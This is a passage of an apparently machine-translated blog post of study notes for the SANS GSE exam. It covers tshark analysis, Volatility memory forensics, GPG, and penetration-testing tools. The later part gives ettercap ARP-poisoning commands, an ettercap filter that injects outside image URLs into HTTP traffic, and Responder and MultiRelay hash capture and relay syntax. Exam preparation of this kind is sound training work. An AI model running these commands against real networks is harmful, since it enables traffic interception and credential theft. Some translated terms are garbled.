data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J_26Lzo5IUPreghIWduYxg.png"/></div></div></figure><h2 id="5f01" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Wireshark和Tshark</h2><p id="44d8" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">除了tcpdump之外，除了基本读取流之外，这些绝对是很好的工具。有一些很好的用例及特性，虽然不会涵盖所有；这里有一些特性可以帮助你摆脱困境，或者让你的分析更有效率。这里有一些用例一行程序，您可能会发现有助于您的分析:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4139" class="lf lg it mx b gy nb nc l nd ne">#Regex filter on HTTP GET URI's 1-10 characters<br/>tshark -r /path/mypcap.pcap -Y 'http &amp;&amp; http.request.uri matches ".{1,10}"' <br/><br/>#bash env variable wrapper in case you have IPython interpreter issues in Google Colab<br/>regexstr=".{1,10}"<br/>tshark -r /path/mypcap.pcap -Y "http.request.uri $regexstr"<br/><br/>#look at protocol statistics based on ports for TCP/UDP<br/>tshark -r foo.pcap -z conv,tcp -z conv,udp -q<br/><br/>#simple display filter used in wireshark case sensitive<br/>tshark -r /path/mypcap.pcap -Y "tcp contains "POST"</span><span id="127b" class="lf lg it mx b gy nr nc l nd ne">#carve out http object files<br/>tshark -r /path/mypcap.pcap --export-objects "http,/output/dir"</span><span id="558f" class="lf lg it mx b gy nr nc l nd ne">#tshark to pre-process and pipe to geoip<br/>tshark -r /path/mypcap.pcap -T fields -e ip.dst | sort -u | geoip</span><span id="8a0a" class="lf lg it mx b gy nr nc l nd ne">#Export records to a CSV<br/>tshark -i wlan1 -T fields -E separator=, -E quote=d -e _ws.col.No. -e _ws.col.Time -e _ws.col.Source -e _ws.col.Destination -e _ws.col.Protocol -e _ws.col.Length -e _ws.col.Info subtype probereq &gt;testfile.txt<br/>tshark -r test.pcap -T fields -e frame.number -e frame.time -e eth.src -e eth.dst -e ip.src -e ip.dst -e ip.proto -E header=y -E separator=, -E quote=d -E occurrence=f &gt; test.csv</span></pre><p id="204b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">将记录导出到CSV </em></p><p id="e4e1" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我在Kali 2018.1版本中注意到的一件事是，Wireshark在GUI中没有文件菜单选项来将整个数据包记录导出到CSV。但是，Tshark可以使用您选择的字段来完成。打印任何一组列的语法依赖于下面显示的字段过滤器。你可能需要一个CSV，因为如果你最终在其他报告工具中使用它，它会毫无怨言。如果您在虚拟机和主机之间传输CSVPowershell内置的Import-CSV cmdlet对于后期处理来说是牛逼的。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ot"><img src="../Images/9b64bd005eabd2fda0420e1d15ea8b88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-7kD2gfesuRuCyKCu4oh9w.png"/></div></div></figure><p id="397d" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">文件雕刻</em></p><p id="36bb" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在Wireshark或Tshark中，您可以将文件刻录到任何给定的目录。该套件本身支持HTTP、SMB、TFTP、IMF和DICOM。我做分析师的时候还没见过IMF用。我看过<a class="ae le" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC61235/#:~:text=The%20Digital%20Imaging%20and%20Communications,images%20and%20image%2Drelated%20information." rel="noopener ugc nofollow" target="_blank"> DICOM </a>，如果你没有在医疗保健行业工作过，这是生物医学模态机器中的一种常见成像协议。tshark中的方法如下所示:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ou"><img src="../Images/73868b9eaeb7bdfbd2d6dc24ced2a36f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y1EtFCcH6jOWoYiCHlBGTA.png"/></div></div></figure><p id="9ab5" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr"> GeoIP </em></p><p id="4dbc" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">对于Kali 2018.1虚拟机的原生版本，即使Wireshark报告启用了GeoIP数据库路径，tshark也不会让我解析GeoIP列字段，并且我在Wireshark中尝试的显示过滤器也不起作用。我也不指望它能在考试中发挥作用；不过，您确实有“geoip”命令，它引用了您可以在后处理中使用的标准数据库。我们使用tshark作为助手，并通过管道将其传输到geoip，只有唯一的目的ip。这对于确定你是否潜在地感染了恶意软件C2或数据泄露案例非常有用。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ov"><img src="../Images/94ffb9430d94276de08c9612fa70d34b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*siFQU-QRl-yQcGsbFvTQzQ.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ot"><img src="../Images/6db96868316a981b6b87c922690328d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lY4nR5C-K0E1sKthgok4mw.png"/></div></div></figure><p id="e908" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">视觉分析</em></p><p id="d07b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">就像tshark可以使用“z”参数输出统计数据一样，您可以在wireshark的GUI中看到类似的情况，通过单击statistics菜单来帮助您缩小可能需要查看的位置，如下所示:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ow"><img src="../Images/93889e6620547a0a134f3c2d0eee10f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AD0cxu0byiNqdqzviXkT6g.png"/></div></div></figure><p id="8da9" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">看起来在nmap探测中使用服务枚举函数检查了很多默认端口。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ox"><img src="../Images/fd7b4dab942f9c4c783e704aa02cc393.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3bmEjCE4dz0MDkwxrdw5dQ.png"/></div></div></figure><p id="f324" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在同一个pcap上，我们查看协议层次结构，以确定我们的大部分流量位于何处，并列出所使用的协议类型。这将从自上而下的钻取点补充您的tshsark端点统计和流记录分析。</p><p id="323d" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">防火墙规则</em></p><p id="7b07" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">有时我不记得IPtables和chains规则语法。大多数企业都没有使用iptables作为防火墙。但是它可能会出现在你的考试中，因为在你的《GSEC与GCIA》中肯定会提到。Kali 2018.1中的Wireshark有一个规则提示器，可以根据它看到的流量提示您阻止或允许什么。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi oy"><img src="../Images/462069134bcf487561d0f6d3f092012f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w01Xh_Z0PwkU5Bd7uQSHcg.png"/></div></div></figure><p id="08a7" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">点击工具菜单，找到建议的防火墙ACL规则区域。在快速语法提醒的情况下非常漂亮。</p><p id="43be" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">证件提取</em></p><p id="8a27" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在以后的版本中；包括Windows在内，您也可以在工具中看到“凭据”提取。我无法让Wireshark提取包括telnet在内的最基本的协议交换。提取的鲁棒性根本不存在，我不会指望它在你的考试中。请考虑诸如ettercap或该隐和亚伯之类的工具。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi oz"><img src="../Images/68039a7d527b03616598a7f7035f8f5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1KHjfJ6w_nOCCElDbSlStg.png"/></div></div></figure><h2 id="5d14" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">通用主机取证</h2><p id="032e" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">虽然GSEC、GCIA和GCIH不像GCFA那样关注内存或逻辑和物理主机映像；你可能会被要求分析图像或时间线。通常，您知道需要为手动表单中的日志做些什么——您正在运行grep并通过管道传输所有内容。或者在powershell中，您正在对Format-Table和Get-WinEvent cmdlet做类似的事情。因此，我们不会过多地关注日志解析，尽管我将在后面的小节中展示一些不错的PowerShell one liners。让我们深入了解如何自动化以及如何处理逻辑主机和内存映像。</p><h2 id="b4cb" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">易失性记忆图像分析</h2><p id="3edf" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">在GCIH的后续版本中，您可能会遇到记忆成像基础分析的rekall或Volatility。如果您不每天使用它或使用企业工具，那么在考试期间尝试“动态学习”要应用的内存语法和配置文件会变得有点麻烦。你不想那样。《T4》无记忆备忘单可能会有所帮助。让我们看看如何使用波动性，并从NIST获取一些示例图片:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pa"><img src="../Images/de55d07321ca259060dd00b173dd09c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XV3_3DfTM2Z4jsf5li0eZg.png"/></div></div></figure><p id="015c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">提取后；假设我们对操作系统主机所在的映像一无所知。请注意，这需要很长时间，因为它会遍历图像的不同区域。如果为您提供了操作系统和补丁级别；不要在这里浪费时间等待结果。我们需要运行图像信息模块来确定使用什么配置文件，因为我们假装没有这些信息:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pb"><img src="../Images/1be5e449186ac76624abc2f8f90c7b8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jR1XdTfobt4km6RtideFiw.png"/></div></div></figure><p id="5fac" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">一旦建议了适当的配置文件，在这种情况下，我们知道我们运行的是32位Windows Server 2003 plain，没有服务包或r 2版本。如果你没有运行这个程序，也不记得确切的标签是什么，那该怎么办？运行“volatility-info | grep-I‘A Profile for Windows’”来获取列表。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pc"><img src="../Images/87ee3f7815fad94584d043f3bd109355.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4I5_ER1tQqop_HghofX4bg.png"/></div></div></figure><p id="c58a" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我喜欢运行的一个关键特性是时间线模块，并将其转储到某个文件中。volatility的语法通常是“volatility-f<myimage>—profile<foo>module 2 run。让我们使用时间轴模块，以UTC格式从内存中获取有关主机的所有信息:</foo></myimage></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pd"><img src="../Images/f8f12aca1b276b4b96803778710fca79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*avLbF1-4aM-YyWcxxtrXoA.png"/></div></div></figure><p id="396e" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">另一个非常有助于确定用户或恶意软件活动的模块是查看运行了什么。有些人喜欢立即启动“ps”模块，如“pslist、psscan和pstree ”,虽然它们是不错的起点。我想看看<strong class="kk iu">完整的</strong>语法跑。稍后，我总能追溯到一棵树或不同的PID/PPID。为此，请运行“cmdline”模块。为了好玩，我运行了“剪贴板”模块，只是为了看看是否有从某个地方粘贴的密码。*你永远不知道！*</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pe"><img src="../Images/b73df99a8f9915d684d3a9bc4e9eca42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8ozVzatn_DT7MYMPPjvwBQ.png"/></div></div></figure><p id="41b5" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">一些其他有用的模块，它们创建了您应该熟悉的某些输出，以防您被要求检查没有其他数据的“日志文件”；可能会要求您验证在分析工具中运行了哪个模块或命令。了解其他一些模块的输出会大大加快您的分析速度:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pf"><img src="../Images/dfcbcc88366ef62f97378d42a896d074.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i2fHlJNv6YUEoL5ylxMR8Q.png"/></div></div></figure><p id="6911" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">另一个不太常见的模块是“屏幕截图”模块，您也必须使用“volatility-f<myimage>—profile =<profilename>screen down—dump dir/tmp/foo”添加一个输出目录。它没有给你一个完整的截图，而是一个你可以在GNOME中显示的GDI线框。它显示标题和对象栏。从自上而下的角度来看，它给了你一些用户当时可能在做什么的线索。如果您能看到线框，这也有助于防止您在检查过程树或列表时遗漏关键细节。</profilename></myimage></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pg"><img src="../Images/b47e4c6d50888dae67d50ec96f2b73b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nSLy-zHfFdL-J4-R9NUbng.png"/></div></div></figure><h2 id="fc4f" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">使用字符串的内存分析注意事项</h2><p id="d2c1" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">除了波动性，字符串不仅仅是看二进制。您也可以在内存转储中运行它。然而，你可能会得到垃圾和非常有限的细节运行它。在我们的windows转储中，我们需要指定以“little endian”方式检查它，现在我们已经捕获了更有意义的项目，包括可能粘贴到记事本中的内容。SANS的书会提到在ASCII和Unicode中使用字符串；但是我不记得他们在任何时候指定使用该架构:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ph"><img src="../Images/d4e6e540e3d79256663a87df4cad7a30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yVmmm31ftW9p3aVWNEHvVg.png"/></div></div></figure><h2 id="e20d" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">使用解剖分析主机逻辑映像</h2><p id="05b2" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">尸检是侦探工具箱的一部分，是DFIR审查员的GUI前端。如果你有一个原始图像，这是一个很好的起点。GCFA覆盖了命令行，只有使用效果更好；但对于GSE的目的，你可能不会有那种时间和层次的深刻雕琢和期待。你可能会得到一个预先创建的超级时间线，并被要求解析它。这可能就是您的grep、awk、cut和windows PowerShell技能发挥作用的地方。但是让我们假设你可能得到一个没有好的索引的原始图像。你现在只用一个卡利盒做什么？解剖它。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pi"><img src="../Images/cab1045d34ccb67488fffab357c18b6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qu1Rk3vei628LPtCcM0vRQ.png"/></div></div></figure><p id="0990" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">运行尸检并按照提示创建案例。从那里，您可以提取系统上留下的许多工件的时间线数据。请注意，这不是GCIA、GSEC或GCIH的重点，但可能会根据您在实验中的情景向您提问。</p><h2 id="a3ae" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">用GPG加密和签名</h2><p id="5c57" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">在GSE信息页面上，GPG的使用与对称和非对称加密中的密钥创建一起列出。你也可能会被要求签署文件和档案。在转向笔测试和黑客技术之前，让我们快速地讨论一下这个问题。让我们从生成一些密钥开始。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pj"><img src="../Images/213bf24b3a30c5921aa3d6ba25b4d404.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hvaty4buYDgNJTU289RT5Q.png"/></div></div></figure><p id="738e" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">输入正确的姓名和电子邮件，因为您将在稍后的密钥环管理中使用该名称和电子邮件。您可能还需要撤销密钥，或者在测试中被要求这样做。因此，如果您需要运行撤销，请使用“gpg —完整生成密钥”来代替。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pk"><img src="../Images/532c900f00168ff39e9b93dccb768702.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iR-9qJEyGS82qmfsUpLfLA.png"/></div></div></figure><p id="4646" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">使用“— list-keys”语法列出您在公共环中生成的密钥。用户电子邮件是您引用密钥的方式。正如你所看到的，我已经在下面的二月份创建了一些。我们可以运行输出和导出开关，将我的特定公钥导出给你希望交流的人。如果您需要将其导出为可以导入到其他实用程序中的普通txt文件，您需要使用“armor”开关:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pl"><img src="../Images/eeceecdf2a7ed1d24a8429a3d4831f4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*60dch1GLUUCxCy9XAXJPhg.png"/></div></div></figure><p id="b9a8" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">现在让我们加密和解密一个简单的文本文件。我将触摸并回显输出到一个文件中。要使用内置密钥环中的私钥进行加密，请执行“gpg —输出加密文件. pgp —加密—接收方<target emai="">”。要解密它，请确保收件人有一份您的公钥的副本，使用相同的方法，但使用解密功能。公钥可以通过“gpg-import<senderskey.gpg>插入到您的钥匙圈中</senderskey.gpg></target></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pm"><img src="../Images/2cd1cd03bbaaa09c1a15429f80aa53e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dc66QiBV_CZ2iEstG1XEMQ.png"/></div></div></figure><p id="22ec" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">同样，您可以通过在提示符下指定密码来使用对称加密。要做到这一点，只需gpg-output<encryptedfile.gpg>-symmetric filetoencrypt . txt”。bash中的一个for循环表明，不管使用md5sum的加密函数类型是什么，文件的完整性都保持不变。</encryptedfile.gpg></p><h1 id="9a08" class="pn lg it bd lh po pp pq lk pr ps pt ln jz pu ka lq kc pv kd lt kf pw kg lw px bi translated">一般渗透测试技能</h1><p id="bca4" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">作为GCIH的一部分，您学习了一般的黑客技术，并且您可能还记得您的实验室展示了一些工具。即使作为防守队员，你也应该能操作基本的红队工具和方法。我们将讨论一些更难的问题，我认为由于涉及到实际操作和实践，大多数分析师都有困难。让我们开始吧。通常，您可能希望记住bash shell历史、“ps -ef”工件、wtmp/utmp和/var/log消息。你也可以在每次进攻的时候运行pcaps来检查你作为防守者可以看到的额外练习。</p><h2 id="bc78" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">中间人(MiTM)攻击</h2><p id="ab95" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">大多数分析师擅长使用ettercap、cain和responder基本用法。然而，扩展的功能有时也会被遗漏，例如ettercap过滤器，它可以作为一个“netsed”等价物，而不必使用网桥或iptables，对于Responder，大多数分析师不习惯于只手动破解哈希而不是中继。如果你想知道为什么我没有提到bettercap是因为我觉得它不是GSE Kali 2018.1映像中可用的工具。在后MS08–067时代，你需要知道传递散列不能在相同的原始受害者主机上重放；它必须被传递。我们也要设置它。让我们从ettercap开始。</p><h2 id="a133" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Ettercap</h2><p id="b61a" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">大多数情况下，您将使用“ettercap -G”和ncurses GUI。然而，记住命令行语法也很重要，如果您的GUI一直崩溃，它可能会派上用场。一个有用的特性是，您还可以嗅探pcap的凭证。语法是:“ettercap -T -r mypcap.pcap”。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi py"><img src="../Images/cc59e1678b4ba007d13b09657b20d1c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BDeP-byNq-ve2hILvmqXDA.png"/></div></div></figure><p id="6c1f" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">这里还有一些来自控制台的更多扩展使用案例:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="376b" class="lf lg it mx b gy nb nc l nd ne">#console search a pcap for passwords and display 3 lines before and after for connection details<br/>ettercap -T -r mypcap.pcap | grep -i "pass*" -A3 -B3<br/><br/>#arp poisioning for all hosts on the subnet with MiTM option enabled<br/>ettercap -T -M arp:remote //<br/><br/>#live capture on an iface with promisc mode and only display passwords and other critical details <br/>ettercap -Tzq -i eth0<br/><br/>#use ettercap plugin filter (compiled by etterfilter)<br/>ettercap -T -M arp:remote // -M ARP /sourceip/ /targetip/ -F &lt;myfilter.ef&gt;<br/><br/>#compile en ettercap filter<br/>etterfilter myfilter.txt -o myfilter.ef<br/><br/>#filter example http netsed replacement<br/>#disable gzip encoding<br/>if (ip.proto == TCP &amp;&amp; tcp.dst == 80) {<br/>   if (search(DATA.data, "Accept-Encoding")) {<br/>      replace("Accept-Encoding", "Accept-Rubbish!"); <br/>	  # note: replacement string is same length as original string<br/>      msg("removed Accept-Encoding!\n");<br/>   }<br/>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {<br/>replace("img src=", "img src=\"http://www.xtecsystems.com/foo.png\" ");<br/>replace("IMG SRC=", "img src=\"http://xtecresearch.cloud/foo.png\" ");<br/>msg("url substituted.\n");<br/>}<br/><br/>#filter example replace data on a packet<br/>if (ip.proto == TCP &amp;&amp; tcp.dst = 80) {<br/>   if ( DATA.data == "foo" ) {<br/>      replace(DATA.data, "bar")</span></pre><h2 id="6b41" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">回答者</h2><p id="f796" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">Responder一般的嗅探模式只是“responder -i eth0 -v”。如果LLMNR和WPAD不在您正在运行的本地网络上，继续并通过遵循到IP responder正在侦听的接口的UNC路径来强制您的连接。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi pz"><img src="../Images/cbd3d85bcc8c2493274c4db25b96cf20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-HFrSjOFAbvPAwcf5NHYkg.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/edcad1afc5be01a6c005a09982476127.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*5T0qv_CzmWjyIvPDvYd7bg.png"/></div></figure><p id="dd70" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">如果你在屏幕上错过了，不要担心。您总是可以在默认的输出日志中找到它，比如/usr/share/responder/logs/下的s</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qb"><img src="../Images/eec8b43f0bf74833fec86a5b882559b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FHZKCE3D97XjrvwvnXoGcA.png"/></div></div></figure><p id="e10c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">当然，传统的方式是在约翰福音中破解它们:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qc"><img src="../Images/80cb210397deacdf943ea5b26ec413b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PaAjCSLQ-8lzBmSrdaqAXQ.png"/></div></div></figure><p id="5400" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">然而，在现代攻击中，你要传递凭证，而不是破解它。为此，您需要修改responder.conf来关闭SMB和HTTP嗅探服务。然后，您将使用相同的参数再次运行Responder，并在单独的窗口中通过语法“python/usr/share/Responder/tools/multi relay . py-t<target to="" relay="" hashes="">-u<user you="" are="" targeting="">(或use -u ALL)运行Impacket MultiRelay.py，如下图所示:</user></target></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qd"><img src="../Images/b67cb03d95e160a526e466c31a7616dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*12ffu576I6RvgWIwNmjfVA.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qe"><img src="../Images/baf03f56641a7a21646e12e7a8e3843d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8f9N07jJ5Capl8f2DR5eIQ.png"/></div></div></figure><h2 id="6a45" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">列举</h2><p id="1c55" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">我们将涵盖Nmap之外的更多枚举。保持自动化和组织化。看一看使用斯巴达。这是一个很棒的包装器，它的GUI使用Nmap、Nikto和Screenshot来根据打开的端口开始收集信息。我们还将介绍如何使用Faraday进行更多的信息收集整合，包括针对web应用程序的dirbuster。</p><h2 id="c8a8" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated"><strong class="ak">斯巴达</strong></h2><p id="37c2" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz 